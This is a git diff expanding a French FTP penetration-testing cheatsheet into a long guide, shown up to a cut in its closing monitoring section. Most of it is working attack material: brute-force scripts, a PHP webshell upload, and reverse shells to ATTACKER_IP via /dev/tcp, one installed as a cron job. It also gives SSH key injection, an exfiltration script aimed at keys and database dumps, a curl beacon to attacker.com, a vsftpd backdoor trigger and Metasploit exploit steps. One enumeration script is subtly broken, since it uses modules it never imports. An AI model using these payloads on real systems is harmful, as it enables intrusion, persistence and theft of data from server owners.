@@ -1,183 +1,1117 @@
-# 📁 FTP - Cheatsheet Cybersécurité
+# 📁 FTP - Guide Complet
 
-Ce fichier regroupe les commandes essentielles pour **scanner**, **brute-forcer**, **exploiter**, et **maintenir un accès** sur un serveur FTP.
-
----
-
-## 🔍 1. Détection & Scan
-
-```
-nmap -p 21 -sV <IP>  
-```
-> Détecte si le port FTP (21) est ouvert et identifie le service
-
-```
-nmap -p 21 --script ftp-anon <IP>  
-```
-> Teste l’accès anonyme sur le serveur FTP
-
-```
-nmap --script ftp-bounce -p 21 <IP>  
-```
-> Vérifie si le serveur est vulnérable au FTP bounce attack
+Guide exhaustif pour l'énumération, l'exploitation et la sécurisation des services FTP, un protocole legacy souvent mal configuré et exploitable.
 
 ---
 
-## 🔑 2. Accès anonyme & bruteforce
+## 📖 Concepts de Base
 
-```
-ftp <IP>  
-```
-> Connexion manuelle (test anonyme avec login `anonymous` et mot de passe vide ou email)
+### Qu'est-ce que le FTP ?
 
-```
-hydra -l ftp -P wordlist.txt ftp://<IP>  
-```
-> Bruteforce d’un utilisateur connu (`ftp`)
+Le **File Transfer Protocol (FTP)** est un protocole réseau pour le transfert de fichiers. En pentesting, FTP est une cible privilégiée car :
+- Authentification souvent faible (anonymous, default creds)
+- Trafic non chiffré (credentials en clair)
+- Mauvaises configurations fréquentes (writable directories)
+- Accès direct aux fichiers système
+- Bounce attacks possibles
 
+**Ports FTP** :
 ```
-hydra -L users.txt -P pass.txt ftp://<IP>  
+21      - FTP Control (commandes)
+20      - FTP Data (transfert de données)
+990     - FTPS (FTP over SSL/TLS)
 ```
-> Bruteforce multi-utilisateurs
+
+**Modes FTP** :
+```
+Active  - Serveur initie connexion data vers client
+Passive - Client initie connexion data vers serveur (plus courant)
+```
 
 ---
 
-## 🗂 3. Navigation & Exfiltration
+## 1️⃣ Reconnaissance et Scan
 
-```
-ftp <IP>  
-```
-> Connexion FTP en mode interactif
+### Détection de service
 
-```
-ls / dir  
-```
-> Liste les fichiers et répertoires
+**Nmap** :
+```bash
+# Scan basique
+nmap -p 21 target.com
 
-```
-cd <dossier>  
-```
-> Changer de dossier
+# Scan avec version
+nmap -p 21 -sV target.com
 
-```
-get <fichier>  
-```
-> Télécharger un fichier depuis le serveur
+# Scan détaillé
+nmap -p 21 -sV -sC target.com
 
-```
-put <fichier>  
-```
-> Envoyer un fichier (si permissions autorisées)
+# Scan complet FTP
+nmap -p 20-21,990 -sV -sC target.com
 
+# Tous les scripts FTP
+nmap -p 21 --script ftp-* target.com
+
+# Output
+nmap -p 21 -sV -sC -oA ftp_scan target.com
 ```
-mget *  
+
+**Scripts Nmap FTP** :
+```bash
+# Anonymous login
+nmap -p 21 --script ftp-anon target.com
+
+# Brute force
+nmap -p 21 --script ftp-brute target.com
+
+# Bounce attack
+nmap -p 21 --script ftp-bounce target.com
+
+# Vulnérabilités
+nmap -p 21 --script ftp-vuln* target.com
+
+# ProFTPd backdoor
+nmap -p 21 --script ftp-proftpd-backdoor target.com
+
+# VSFTPD backdoor
+nmap -p 21 --script ftp-vsftpd-backdoor target.com
+
+# Syst info
+nmap -p 21 --script ftp-syst target.com
 ```
-> Télécharger tous les fichiers du dossier
+
+**Banner Grabbing** :
+```bash
+# Netcat
+nc -nv target.com 21
+
+# Telnet
+telnet target.com 21
+
+# Nmap
+nmap -p 21 -sV --script banner target.com
+```
 
 ---
 
-## 🧠 4. Analyse de fichiers sensibles
+### Énumération du serveur
 
-```
-- `.htpasswd` / `.htaccess`  
-```
-> Fichiers contenant des hashes de mots de passe
+**Identifier la version** :
+```bash
+# Via banner
+nc target.com 21
 
-```
-- `backup.sql`, `db.dump`, `.bak`, `.zip`  
-```
-> Dumps ou archives sensibles à explorer
+# Commande SYST
+echo "SYST" | nc target.com 21
 
-```
-- `config.php`, `wp-config.php`  
-```
-> Contient souvent des credentials MySQL
+# Commande STAT
+ftp target.com
+ftp> stat
 
+# Nmap
+nmap -p 21 --script ftp-syst target.com
 ```
-strings fichier.zip  
+
+**Versions courantes** :
 ```
-> Analyse rapide du contenu s’il est lisible
+vsftpd         - Very Secure FTP Daemon (Linux)
+ProFTPD        - Professional FTP Daemon
+Pure-FTPd      - Secure FTP server
+FileZilla      - FTP server (Windows/Linux)
+Microsoft FTP  - IIS FTP (Windows)
+```
 
 ---
 
-## 💣 5. Upload de payload (si autorisé)
+## 2️⃣ Accès Anonymous
 
-- Reverse shell PHP si webroot accessible :  
+### Test d'accès anonyme
 
-```
-echo "<?php system(\$_GET['cmd']); ?>" > shell.php  
-```
-> Webshell simple en PHP
+**Méthode manuelle** :
+```bash
+# FTP client
+ftp target.com
+Name: anonymous
+Password: anonymous@domain.com
 
+# Ou simplement Enter pour password
 ```
-put shell.php  
-```
-> Upload du shell
 
-Accès : http://victime.com/shell.php?cmd=whoami
+**One-liner** :
+```bash
+# Avec echo
+echo -e "anonymous\nanonymous\nls\nbye" | ftp target.com
+
+# Avec heredoc
+ftp -n target.com << EOF
+user anonymous anonymous
+ls
+bye
+EOF
+```
+
+**Nmap** :
+```bash
+# Test anonymous
+nmap -p 21 --script ftp-anon target.com
+
+# Avec liste de fichiers
+nmap -p 21 --script ftp-anon --script-args ftp-anon.maxlist=100 target.com
+```
+
+**Script automatisé** :
+```bash
+#!/bin/bash
+# test_ftp_anon.sh
+
+TARGET=$1
+
+if [ -z "$TARGET" ]; then
+    echo "Usage: $0 <target>"
+    exit 1
+fi
+
+echo "[*] Testing anonymous FTP access on $TARGET"
+
+# Test anonymous login
+OUTPUT=$(ftp -n $TARGET << EOF
+user anonymous anonymous
+ls
+bye
+EOF
+)
+
+if echo "$OUTPUT" | grep -q "230 Login successful\|230 Anonymous"; then
+    echo "[+] Anonymous login successful!"
+    echo ""
+    echo "[*] Directory listing:"
+    echo "$OUTPUT" | grep -A 100 "150 Here comes"
+else
+    echo "[-] Anonymous login failed"
+fi
+```
 
 ---
 
-## 🧬 6. Maintien d’accès
+### Énumération anonyme
 
-### 🐚 Script FTP en bash
+**Commandes FTP utiles** :
+```bash
+ftp> ls              # Liste fichiers
+ftp> ls -la          # Liste détaillée avec cachés
+ftp> ls -R           # Liste récursive
+ftp> pwd             # Répertoire actuel
+ftp> cd directory    # Changer de répertoire
+ftp> cdup            # Répertoire parent
+ftp> binary          # Mode binaire
+ftp> ascii           # Mode ASCII
+ftp> passive         # Mode passif
+ftp> status          # Statut connexion
+ftp> system          # Info système
+ftp> help            # Commandes disponibles
+```
 
-```
-echo -e "open <IP>\nuser hacker P@ssw0rd\nget secret.txt\nbye" > script.ftp  
-ftp -n < script.ftp  
-```
-> Script d’automatisation pour téléchargement furtif
+**Download récursif** :
+```bash
+# Avec wget
+wget -r ftp://anonymous:anonymous@target.com/
 
-### 📅 Persistance
+# Avec lftp
+lftp -c "open ftp://anonymous:anonymous@target.com; mirror -c"
 
+# Avec ncftp
+ncftpget -R -v -u anonymous target.com /local/path /remote/path
 ```
-put cron.sh  
+
+**Script de download complet** :
+```python
+#!/usr/bin/env python3
+# ftp_download_all.py
+
+from ftplib import FTP
+import os
+import sys
+
+def download_recursive(ftp, remote_dir, local_dir):
+    """Download récursif de tous les fichiers"""
+    
+    if not os.path.exists(local_dir):
+        os.makedirs(local_dir)
+    
+    ftp.cwd(remote_dir)
+    
+    try:
+        items = ftp.nlst()
+    except:
+        return
+    
+    for item in items:
+        local_path = os.path.join(local_dir, item)
+        
+        try:
+            # Essayer de CWD (c'est un dossier)
+            ftp.cwd(item)
+            print(f"[*] Entering directory: {item}")
+            download_recursive(ftp, item, local_path)
+            ftp.cwd('..')
+        except:
+            # C'est un fichier
+            print(f"[+] Downloading: {item}")
+            with open(local_path, 'wb') as f:
+                ftp.retrbinary(f'RETR {item}', f.write)
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <target>")
+        sys.exit(1)
+    
+    target = sys.argv[1]
+    
+    print(f"[*] Connecting to {target}")
+    
+    try:
+        ftp = FTP(target)
+        ftp.login('anonymous', 'anonymous@domain.com')
+        
+        print("[+] Anonymous login successful")
+        print(f"[*] Current directory: {ftp.pwd()}")
+        
+        download_recursive(ftp, '.', './ftp_download')
+        
+        ftp.quit()
+        print("\n[+] Download complete")
+        
+    except Exception as e:
+        print(f"[-] Error: {e}")
+
+if __name__ == "__main__":
+    main()
 ```
-> Upload d’un script cron si accès à `/etc/cron.*`
 
 ---
 
-## 🧹 7. Nettoyage
+## 3️⃣ Brute Force
 
-```
-del shell.php  
-```
-> Supprime un shell PHP après usage
+### Hydra
 
+```bash
+# User connu
+hydra -l admin -P passwords.txt ftp://target.com
+
+# Liste d'utilisateurs
+hydra -L users.txt -P passwords.txt ftp://target.com
+
+# Avec port custom
+hydra -l admin -P passwords.txt ftp://target.com:2121
+
+# Threads
+hydra -l admin -P passwords.txt -t 16 ftp://target.com
+
+# Verbose
+hydra -l admin -P passwords.txt -V ftp://target.com
+
+# Output
+hydra -l admin -P passwords.txt ftp://target.com -o ftp_creds.txt
+
+# Continue sur success
+hydra -l admin -P passwords.txt -f ftp://target.com
 ```
-rm script.ftp  
-```
-> Supprime un script local
 
 ---
 
-## ⚠️ 8. Vulnérabilités classiques
+### Medusa
 
-- FTP anonyme sans restriction  
-- Accès en écriture non sécurisé  
-- Vulnérabilité FTP Bounce  
-- Informations sensibles non protégées  
-- FTP utilisé dans un environnement non chiffré (pas de FTPS)
+```bash
+# Basic brute force
+medusa -h target.com -u admin -P passwords.txt -M ftp
 
----
+# Multiple users
+medusa -h target.com -U users.txt -P passwords.txt -M ftp
 
-## 🛠 9. Outils utiles
+# Threads
+medusa -h target.com -u admin -P passwords.txt -M ftp -t 10
 
-- `nmap`  
-> Scanner & scripts NSE FTP
+# Verbose
+medusa -h target.com -u admin -P passwords.txt -M ftp -v 6
 
-- `hydra`  
-> Bruteforce FTP
-
-- `ftpmap`, `medusa`, `ncrack`  
-> Alternatives pour bruteforce et test de connexions
-
-- `metasploit`  
-> Modules FTP (ex: `auxiliary/scanner/ftp/ftp_login`)
+# Output
+medusa -h target.com -u admin -P passwords.txt -M ftp -O ftp_results.txt
+```
 
 ---
 
-## 📚 10. Ressources utiles
+### Ncrack
 
-- [PayloadsAllTheThings - FTP](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Transfer%20Protocols/FTP)
-- [HackTricks - FTP](https://book.hacktricks.xyz/network-services-pentesting/ftp)
+```bash
+# Brute force
+ncrack -p 21 -u admin -P passwords.txt target.com
+
+# Multiple targets
+ncrack -p 21 -U users.txt -P passwords.txt target1.com target2.com
+
+# Rate limiting
+ncrack -p 21 -u admin -P passwords.txt --connection-limit 5 target.com
+```
+
+---
+
+### Metasploit
+
+```bash
+msfconsole
+
+# FTP login scanner
+use auxiliary/scanner/ftp/ftp_login
+set RHOSTS target.com
+set USER_FILE users.txt
+set PASS_FILE passwords.txt
+set THREADS 10
+run
+
+# Anonymous scanner
+use auxiliary/scanner/ftp/anonymous
+set RHOSTS 192.168.1.0/24
+run
+```
+
+---
+
+### Script Python custom
+
+```python
+#!/usr/bin/env python3
+# ftp_brute.py
+
+from ftplib import FTP
+import sys
+from concurrent.futures import ThreadPoolExecutor
+
+def try_login(target, user, password):
+    """Essaie une combinaison user/pass"""
+    try:
+        ftp = FTP(target, timeout=5)
+        ftp.login(user, password)
+        ftp.quit()
+        return (user, password, True)
+    except:
+        return (user, password, False)
+
+def brute_force(target, users, passwords, threads=10):
+    """Brute force FTP"""
+    
+    print(f"[*] Starting FTP brute force on {target}")
+    print(f"[*] Users: {len(users)}, Passwords: {len(passwords)}")
+    print(f"[*] Total attempts: {len(users) * len(passwords)}\n")
+    
+    attempts = []
+    for user in users:
+        for password in passwords:
+            attempts.append((target, user.strip(), password.strip()))
+    
+    found = []
+    
+    with ThreadPoolExecutor(max_workers=threads) as executor:
+        results = executor.map(lambda x: try_login(*x), attempts)
+        
+        for user, password, success in results:
+            if success:
+                print(f"[+] SUCCESS: {user}:{password}")
+                found.append((user, password))
+    
+    return found
+
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print(f"Usage: {sys.argv[0]} <target> <users_file> <passwords_file>")
+        sys.exit(1)
+    
+    target = sys.argv[1]
+    
+    with open(sys.argv[2]) as f:
+        users = f.readlines()
+    
+    with open(sys.argv[3]) as f:
+        passwords = f.readlines()
+    
+    results = brute_force(target, users, passwords)
+    
+    if results:
+        print(f"\n[+] Found {len(results)} valid credentials")
+        for user, password in results:
+            print(f"  {user}:{password}")
+    else:
+        print("\n[-] No valid credentials found")
+```
+
+---
+
+## 4️⃣ Exploitation
+
+### Upload de webshell
+
+**Scénario** : FTP avec accès write dans webroot
+
+```bash
+# Connexion
+ftp target.com
+Name: ftpuser
+Password: password123
+
+# Vérifier répertoire
+ftp> pwd
+257 "/var/www/html" is current directory
+
+# Créer webshell local
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+
+# Upload
+ftp> binary
+ftp> put shell.php
+ftp> ls
+-rw-r--r--   1 ftp  ftp    32 Dec 14 10:30 shell.php
+
+ftp> bye
+
+# Accès
+curl "http://target.com/shell.php?cmd=whoami"
+```
+
+**Webshells avancés** :
+```php
+// shell.php - Simple
+<?php system($_GET['cmd']); ?>
+
+// b374k.php - Full featured
+// https://github.com/b374k/b374k
+
+// c99.php - Classic
+// Rechercher "c99 shell"
+
+// WSO shell - Web Shell by Orb
+// https://github.com/tennc/webshell
+```
+
+---
+
+### FTP Bounce Attack
+
+**Principe** : Utiliser un serveur FTP comme proxy pour scanner d'autres machines.
+
+```bash
+# Nmap bounce scan
+nmap -b ftp-user:password@ftp-server:21 target.com
+
+# Exemple
+nmap -b anonymous:anonymous@vulnerable-ftp.com:21 internal-server.local
+
+# Avec script
+nmap -p 21 --script ftp-bounce target.com
+```
+
+**Exploitation manuelle** :
+```bash
+# Connexion au FTP vulnérable
+ftp vulnerable-ftp.com
+
+# Commande PORT pour rediriger connexion
+ftp> quote "PORT 192,168,1,10,0,80"
+200 PORT command successful
+
+# Tenter connexion
+ftp> ls
+# Si succès, port 80 est ouvert sur 192.168.1.10
+```
+
+---
+
+### Path Traversal
+
+**Test** :
+```bash
+ftp> cd ../../../etc
+ftp> get passwd
+
+# Ou
+ftp> get ../../../etc/passwd
+
+# Windows
+ftp> get ..\..\..\..\windows\system32\config\sam
+```
+
+**Script automatisé** :
+```python
+#!/usr/bin/env python3
+# ftp_path_traversal.py
+
+from ftplib import FTP
+import sys
+
+def test_path_traversal(target, user, password):
+    """Test path traversal sur FTP"""
+    
+    paths = [
+        '../../../etc/passwd',
+        '../../../../etc/passwd',
+        '../../../../../etc/passwd',
+        '..\\..\\..\\windows\\system32\\config\\sam',
+        '../../../../windows/win.ini',
+    ]
+    
+    try:
+        ftp = FTP(target)
+        ftp.login(user, password)
+        
+        print(f"[+] Connected to {target}")
+        
+        for path in paths:
+            try:
+                print(f"[*] Testing: {path}")
+                
+                # Essayer de télécharger
+                with open('test_output.txt', 'wb') as f:
+                    ftp.retrbinary(f'RETR {path}', f.write)
+                
+                # Vérifier si fichier téléchargé
+                with open('test_output.txt', 'r') as f:
+                    content = f.read(100)
+                    if content:
+                        print(f"[+] SUCCESS! Path traversal works")
+                        print(f"[+] Content preview: {content[:50]}...")
+                        return True
+            except Exception as e:
+                pass
+        
+        ftp.quit()
+        
+    except Exception as e:
+        print(f"[-] Error: {e}")
+    
+    return False
+
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print(f"Usage: {sys.argv[0]} <target> <user> <password>")
+        sys.exit(1)
+    
+    test_path_traversal(sys.argv[1], sys.argv[2], sys.argv[3])
+```
+
+---
+
+### Fichiers sensibles
+
+**Linux** :
+```bash
+# Credentials
+/etc/passwd
+/etc/shadow
+/etc/group
+/root/.ssh/id_rsa
+/home/user/.ssh/id_rsa
+/home/user/.bash_history
+
+# Configuration
+/etc/apache2/apache2.conf
+/etc/nginx/nginx.conf
+/etc/php/7.4/apache2/php.ini
+/etc/mysql/my.cnf
+
+# Web
+/var/www/html/config.php
+/var/www/html/wp-config.php
+/var/www/html/.env
+/var/www/html/database.yml
+
+# Logs
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/log/auth.log
+```
+
+**Windows** :
+```cmd
+# System
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SYSTEM
+C:\Windows\win.ini
+C:\Windows\system.ini
+
+# Credentials
+C:\Users\Administrator\Desktop\
+C:\Users\user\AppData\
+C:\Users\user\Documents\
+
+# IIS
+C:\inetpub\wwwroot\web.config
+C:\inetpub\logs\LogFiles\
+
+# FileZilla
+C:\Program Files\FileZilla Server\FileZilla Server.xml
+C:\Users\user\AppData\Roaming\FileZilla\recentservers.xml
+```
+
+---
+
+## 5️⃣ Persistence
+
+### Backdoor via FTP
+
+**Upload de reverse shell** :
+```bash
+# Créer reverse shell
+cat > shell.sh << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+EOF
+
+# Upload
+ftp> binary
+ftp> put shell.sh /tmp/shell.sh
+ftp> chmod 755 /tmp/shell.sh
+
+# Si FTP permet SITE CHMOD
+ftp> quote "SITE CHMOD 755 /tmp/shell.sh"
+```
+
+**Cron job via FTP** :
+```bash
+# Si accès à /var/spool/cron/crontabs/
+echo "* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > cron_job
+
+ftp> put cron_job /var/spool/cron/crontabs/www-data
+```
+
+**SSH key injection** :
+```bash
+# Générer clé
+ssh-keygen -t rsa -f ftp_backdoor
+
+# Upload clé publique
+ftp> mkdir .ssh
+ftp> cd .ssh
+ftp> put ftp_backdoor.pub authorized_keys
+ftp> chmod 600 authorized_keys
+
+# Connexion
+ssh -i ftp_backdoor user@target.com
+```
+
+---
+
+### Backdoor FTP server
+
+**Script de monitoring** :
+```bash
+#!/bin/bash
+# ftp_monitor.sh
+
+FTP_HOST="target.com"
+FTP_USER="ftpuser"
+FTP_PASS="password"
+CHECK_INTERVAL=300  # 5 minutes
+
+while true; do
+    # Vérifier connexion
+    ftp -n $FTP_HOST << EOF > /dev/null 2>&1
+user $FTP_USER $FTP_PASS
+pwd
+bye
+EOF
+    
+    if [ $? -eq 0 ]; then
+        echo "[$(date)] FTP access still active"
+    else
+        echo "[$(date)] FTP access lost - alerting"
+        # Envoyer notification
+        curl "http://attacker.com/alert?msg=FTP_lost"
+    fi
+    
+    sleep $CHECK_INTERVAL
+done
+```
+
+---
+
+## 6️⃣ Post-Exploitation
+
+### Énumération complète
+
+```bash
+# Connexion
+ftp target.com
+
+# Info système
+ftp> syst
+215 UNIX Type: L8
+
+# Statut
+ftp> status
+Connected to target.com.
+Type: binary; Verbose: on; Bell: off; Prompting: on; Globbing: on
+
+# Répertoire home
+ftp> pwd
+257 "/home/ftpuser" is current directory
+
+# Liste complète
+ftp> ls -laR
+```
+
+**Script d'énumération** :
+```python
+#!/usr/bin/env python3
+# ftp_enum.py
+
+from ftplib import FTP
+import sys
+
+def enumerate_ftp(target, user, password):
+    """Énumération complète FTP"""
+    
+    try:
+        ftp = FTP(target)
+        ftp.login(user, password)
+        
+        print(f"[+] Connected to {target}")
+        print(f"[+] User: {user}\n")
+        
+        # Système
+        print("[*] System Information:")
+        try:
+            print(f"  {ftp.getwelcome()}")
+            print(f"  System: {ftp.sendcmd('SYST')}")
+        except:
+            pass
+        
+        # Répertoire actuel
+        print(f"\n[*] Current directory: {ftp.pwd()}")
+        
+        # Permissions
+        print("\n[*] Testing permissions:")
+        
+        # Read
+        try:
+            ftp.retrlines('LIST')
+            print("  [+] READ permission: YES")
+        except:
+            print("  [-] READ permission: NO")
+        
+        # Write
+        try:
+            test_file = 'test_write_' + str(os.getpid())
+            ftp.storbinary(f'STOR {test_file}', io.BytesIO(b'test'))
+            ftp.delete(test_file)
+            print("  [+] WRITE permission: YES")
+        except:
+            print("  [-] WRITE permission: NO")
+        
+        # Liste fichiers
+        print("\n[*] Files and directories:")
+        try:
+            files = []
+            ftp.retrlines('LIST', files.append)
+            for f in files[:20]:  # Limiter à 20
+                print(f"  {f}")
+            if len(files) > 20:
+                print(f"  ... and {len(files)-20} more")
+        except:
+            pass
+        
+        ftp.quit()
+        
+    except Exception as e:
+        print(f"[-] Error: {e}")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print(f"Usage: {sys.argv[0]} <target> <user> <password>")
+        sys.exit(1)
+    
+    enumerate_ftp(sys.argv[1], sys.argv[2], sys.argv[3])
+```
+
+---
+
+### Exfiltration de données
+
+**Download massif** :
+```bash
+# Avec wget
+wget -r --no-passive ftp://user:pass@target.com/
+
+# Avec lftp
+lftp -c "open ftp://user:pass@target.com; mirror -c --parallel=10 / /local/backup"
+
+# Avec ncftp
+ncftpget -R -u user -p pass target.com /local/path /remote/path
+```
+
+**Script d'exfiltration sélective** :
+```python
+#!/usr/bin/env python3
+# ftp_exfiltrate.py
+
+from ftplib import FTP
+import os
+import sys
+import re
+
+def should_download(filename, patterns):
+    """Vérifie si le fichier correspond aux patterns"""
+    for pattern in patterns:
+        if re.search(pattern, filename, re.IGNORECASE):
+            return True
+    return False
+
+def exfiltrate_files(target, user, password, patterns, output_dir):
+    """Exfiltre fichiers selon patterns"""
+    
+    # Patterns intéressants par défaut
+    if not patterns:
+        patterns = [
+            r'\.sql$',
+            r'\.bak$',
+            r'\.zip$',
+            r'config',
+            r'password',
+            r'secret',
+            r'\.key$',
+            r'\.pem$',
+            r'\.p12$',
+        ]
+    
+    try:
+        ftp = FTP(target)
+        ftp.login(user, password)
+        
+        print(f"[+] Connected to {target}")
+        print(f"[*] Searching for interesting files...\n")
+        
+        # Liste tous les fichiers
+        files = []
+        ftp.retrlines('LIST', files.append)
+        
+        downloaded = 0
+        
+        for file_info in files:
+            # Parser nom fichier
+            parts = file_info.split()
+            if len(parts) < 9:
+                continue
+            
+            filename = ' '.join(parts[8:])
+            
+            # Vérifier pattern
+            if should_download(filename, patterns):
+                print(f"[+] Downloading: {filename}")
+                
+                local_path = os.path.join(output_dir, filename)
+                
+                try:
+                    with open(local_path, 'wb') as f:
+                        ftp.retrbinary(f'RETR {filename}', f.write)
+                    downloaded += 1
+                except Exception as e:
+                    print(f"  [-] Error: {e}")
+        
+        ftp.quit()
+        
+        print(f"\n[+] Downloaded {downloaded} files to {output_dir}")
+        
+    except Exception as e:
+        print(f"[-] Error: {e}")
+
+if __name__ == "__main__":
+    if len(sys.argv) < 5:
+        print(f"Usage: {sys.argv[0]} <target> <user> <password> <output_dir> [patterns...]")
+        print(f"Example: {sys.argv[0]} target.com admin pass123 ./output '\\.sql$' 'config'")
+        sys.exit(1)
+    
+    target = sys.argv[1]
+    user = sys.argv[2]
+    password = sys.argv[3]
+    output_dir = sys.argv[4]
+    patterns = sys.argv[5:] if len(sys.argv) > 5 else None
+    
+    if not os.path.exists(output_dir):
+        os.makedirs(output_dir)
+    
+    exfiltrate_files(target, user, password, patterns, output_dir)
+```
+
+---
+
+## 7️⃣ Vulnérabilités Spécifiques
+
+### ProFTPD Backdoor (CVE-2010-4221)
+
+```bash
+# Nmap detection
+nmap -p 21 --script ftp-proftpd-backdoor target.com
+
+# Metasploit
+msfconsole
+use exploit/unix/ftp/proftpd_133c_backdoor
+set RHOSTS target.com
+set PAYLOAD cmd/unix/reverse
+set LHOST attacker_ip
+exploit
+```
+
+---
+
+### VSFTPD Backdoor (CVE-2011-2523)
+
+```bash
+# Nmap detection
+nmap -p 21 --script ftp-vsftpd-backdoor target.com
+
+# Metasploit
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS target.com
+set PAYLOAD cmd/unix/interact
+exploit
+```
+
+**Exploitation manuelle** :
+```bash
+# Connexion avec trigger
+nc target.com 21
+USER backdoor:)
+PASS backdoor
+
+# Shell sur port 6200
+nc target.com 6200
+```
+
+---
+
+### FileZilla Server (Password Disclosure)
+
+```bash
+# Fichier de config
+C:\Program Files\FileZilla Server\FileZilla Server.xml
+
+# Contient passwords encodés en base64
+grep -i "password" "FileZilla Server.xml"
+
+# Decoder
+echo "encoded_pass" | base64 -d
+```
+
+---
+
+## 8️⃣ Protection et Mitigation
+
+### Sécurisation du serveur FTP
+
+**VSFTPD configuration** :
+```bash
+# /etc/vsftpd.conf
+
+# Désactiver anonymous
+anonymous_enable=NO
+
+# Chrooter les utilisateurs
+chroot_local_user=YES
+allow_writeable_chroot=YES
+
+# Liste d'utilisateurs autorisés
+userlist_enable=YES
+userlist_deny=NO
+userlist_file=/etc/vsftpd.userlist
+
+# Logging
+xferlog_enable=YES
+xferlog_file=/var/log/vsftpd.log
+
+# Permissions
+local_umask=022
+file_open_mode=0666
+
+# Sécurité
+hide_ids=YES
+pasv_min_port=40000
+pasv_max_port=50000
+
+# Rate limiting
+local_max_rate=1000000
+
+# Banner
+ftpd_banner=FTP Server
+
+# SSL/TLS (FTPS)
+ssl_enable=YES
+allow_anon_ssl=NO
+force_local_data_ssl=YES
+force_local_logins_ssl=YES
+ssl_tlsv1=YES
+ssl_sslv2=NO
+ssl_sslv3=NO
+rsa_cert_file=/etc/ssl/certs/vsftpd.pem
+rsa_private_key_file=/etc/ssl/private/vsftpd.key
+```
+
+---
+
+### Migration vers SFTP
+
+**Pourquoi SFTP** :
+```
+✓ Chiffrement complet
+✓ Utilise SSH (port 22)
+✓ Authentification forte (clés SSH)
+✓ Pas de ports data additionnels
+✓ Firewall-friendly
+```
+
+**Configuration SFTP** :
+```bash
+# /etc/ssh/sshd_config
+
+# SFTP only group
+Match Group sftponly
+    ChrootDirectory /home/%u
+    ForceCommand internal-sftp
+    AllowTcpForwarding no
+    X11Forwarding no
+
+# Créer groupe
+groupadd sftponly
+
+# Ajouter utilisateur
+useradd -m -G sftponly sftpuser
+passwd sftpuser
+
+# Permissions
+chown root:root /home/sftpuser
+chmod 755 /home/sftpuser
+mkdir /home/sftpuser/uploads
+chown sftpuser:sftpuser /home/sftpuser/uploads
+```
+
+---
+
+### Monitoring et Détection
+
+**Fail2Ban pour FTP** :
+```bash
+# /etc/fail2ban/jail.local
+
+[vsftpd]
+enabled = true
+port = ftp,ftp-data,ftps,ftps-data
+logpath = /var/log/vsftpd.log
+maxretry = 3
+bantime = 3600
+```
+
+**Log analysis** :
+```bash
+# Failed logins
+grep "FAIL LOGIN" /var/log/vsftpd.log | awk '{print $NF}' | sort | uniq -c | sort -rn
+
+# Successful logins
+grep "OK LOGIN" /var/log/vsftpd.log
+
+# Uploade
